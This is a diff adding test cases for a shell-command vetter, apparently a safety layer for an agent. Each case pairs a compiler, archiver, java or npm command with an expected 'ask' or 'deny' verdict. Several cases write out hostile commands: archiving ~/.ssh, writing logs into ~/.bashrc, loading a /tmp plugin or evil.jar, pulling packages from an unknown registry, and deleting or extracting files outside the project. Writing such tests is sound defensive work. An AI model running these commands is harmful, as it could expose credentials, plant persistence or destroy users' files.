@@ -1,0 +1,236 @@
+# Options of the tools vetter reads strictly (every option listed: one it
+# doesn't know an Unknown), and the effects found listing them.
+
+[[case]]
+id = "strict-clang-xarch"
+shell = "bash"
+command = "clang -Xarch_x86_64 -fplugin=/tmp/p.so -c x.c"
+runs = ["clang"]
+expect = "ask"
+why = "-Xarch_ hands the next option to that arch's compile: a plugin"
+source = "derived"
+
+[[case]]
+id = "strict-gcc-opt-info"
+shell = "bash"
+command = "gcc -O3 -fopt-info-vec-all=/home/user/.bashrc -c x.c"
+runs = ["gcc"]
+expect = "deny"
+why = "-fopt-info's notes written to ~/.bashrc"
+source = "derived"
+
+[[case]]
+id = "strict-gcc-toolchain"
+shell = "bash"
+command = "clang --gcc-toolchain=/tmp/tc -c x.c"
+runs = ["clang"]
+expect = "ask"
+why = "the as and ld it runs, from /tmp/tc"
+source = "derived"
+
+[[case]]
+id = "strict-java-loggc"
+shell = "bash"
+command = "java -Xloggc:/home/user/.bashrc -jar app.jar"
+runs = ["java"]
+expect = "deny"
+why = "the GC log written to ~/.bashrc"
+source = "derived"
+
+[[case]]
+id = "strict-java-patch-module"
+shell = "bash"
+command = "java --patch-module java.base=/tmp/evil.jar -jar app.jar"
+runs = ["java"]
+expect = "ask"
+why = "java.base's classes from /tmp/evil.jar"
+source = "derived"
+
+[[case]]
+id = "strict-java-unknown"
+shell = "bash"
+command = "java -Xfoo:/tmp/x -jar app.jar"
+runs = ["java"]
+expect = "ask"
+why = "an option vetter doesn't know"
+source = "derived"
+
+[[case]]
+id = "strict-javac-system"
+shell = "bash"
+command = "javac --system /tmp/jdk -d out src/Main.java"
+runs = ["javac"]
+expect = "ask"
+why = "the JDK whose modules javac loads"
+source = "derived"
+
+[[case]]
+id = "strict-zip-move"
+shell = "bash"
+command = "zip -rm old.zip /home/user/work"
+runs = ["zip"]
+expect = "ask"
+why = "-m deletes what it adds: ~/work"
+source = "derived"
+
+[[case]]
+id = "strict-7z-sdel"
+shell = "bash"
+command = "7z a -sdel x.7z /home/user/work"
+runs = ["7z"]
+expect = "ask"
+why = "-sdel deletes the files after adding them"
+source = "derived"
+
+[[case]]
+id = "strict-7z-spf"
+shell = "bash"
+command = "7z x -spf pkg.7z"
+runs = ["7z"]
+expect = "ask"
+why = "-spf extracts to the full paths the archive names"
+source = "derived"
+
+[[case]]
+id = "strict-tar-secrets"
+shell = "bash"
+command = "tar czf /tmp/x.tgz ~/.ssh"
+runs = ["tar"]
+expect = "deny"
+why = "tar reads ~/.ssh into the archive"
+source = "derived"
+
+[[case]]
+id = "strict-tar-C"
+shell = "bash"
+command = "tar -C /home/user -czf /tmp/x.tgz .ssh"
+runs = ["tar"]
+expect = "deny"
+why = ".ssh relative to -C: ~/.ssh"
+source = "derived"
+
+[[case]]
+id = "strict-tar-absolute"
+shell = "bash"
+command = "tar xPf /tmp/pkg.tar"
+runs = ["tar"]
+expect = "ask"
+why = "P keeps the archive's absolute paths: extracted anywhere"
+source = "derived"
+
+[[case]]
+id = "strict-cpio-absolute"
+shell = "bash"
+command = "cpio -idv --absolute-filenames < /tmp/a.cpio"
+runs = ["cpio"]
+expect = "ask"
+why = "extracted to the paths the archive names"
+source = "derived"
+
+[[case]]
+id = "strict-unzip-colon"
+shell = "bash"
+command = "unzip -: /tmp/pkg.zip"
+runs = ["unzip"]
+expect = "ask"
+why = "-: keeps ../ and / in the names"
+source = "derived"
+
+[[case]]
+id = "strict-xz-in-place"
+shell = "bash"
+command = "xz /home/user/work/notes.txt"
+runs = ["xz"]
+expect = "deny"
+why = "xz deletes the file it compresses: outside the project"
+source = "derived"
+
+[[case]]
+id = "strict-npm-registry"
+shell = "bash"
+command = "npm install --registry http://203.0.113.9 lodash"
+runs = ["npm"]
+expect = "ask"
+why = "packages from someone's registry"
+source = "derived"
+
+[[case]]
+id = "strict-npm-strict-ssl"
+shell = "bash"
+command = "npm --strict-ssl=false install"
+runs = ["npm"]
+expect = "ask"
+why = "TLS not checked: what's installed, whoever answers"
+source = "derived"
+
+[[case]]
+id = "strict-npm-init-module"
+shell = "bash"
+command = "npm init -y --init-module /tmp/init.js"
+runs = ["npm"]
+expect = "ask"
+why = "npm init runs the init module"
+source = "derived"
+
+[[case]]
+id = "strict-npm-unknown"
+shell = "bash"
+command = "npm test --some-new-setting=/tmp/x"
+runs = ["npm"]
+expect = "ask"
+why = "a setting vetter doesn't know"
+source = "derived"
+
+[[case]]
+id = "strict-time-unknown"
+shell = "bash"
+command = "/usr/bin/time --output-file=/home/user/.bashrc make"
+runs = ["time", "make"]
+expect = "ask"
+why = "an option vetter doesn't know"
+source = "derived"
+
+[[case]]
+id = "strict-tar-extract-outside"
+shell = "bash"
+command = "tar xzf pkg.tgz -C /usr/local"
+runs = ["tar"]
+expect = "ask"
+why = "what it extracts written to /usr/local"
+source = "derived"
+
+[[case]]
+id = "strict-tar-remote"
+shell = "bash"
+command = "tar czf me@203.0.113.9:/x.tgz src"
+runs = ["tar"]
+expect = "ask"
+why = "the archive written on another host, through rsh"
+source = "derived"
+
+[[case]]
+id = "strict-tar-remove-files"
+shell = "bash"
+command = "tar --remove-files -czf out.tgz /home/user/work"
+runs = ["tar"]
+expect = "ask"
+why = "the files it adds deleted"
+source = "derived"
+
+[[case]]
+id = "strict-tar-dereference"
+shell = "bash"
+command = "tar czhf out.tgz src"
+runs = ["tar"]
+expect = "ask"
+why = "h: what links in src point to read (a link to ~/.ssh)"
+source = "derived"
+
+[[case]]
+id = "strict-tar-one-top-level"
+shell = "bash"
+command = "tar xf pkg.tar --one-top-level=/home/user/.config/autostart"
+runs = ["tar"]
+expect = "ask"
+why = "extracted into autostart"
+source = "derived"
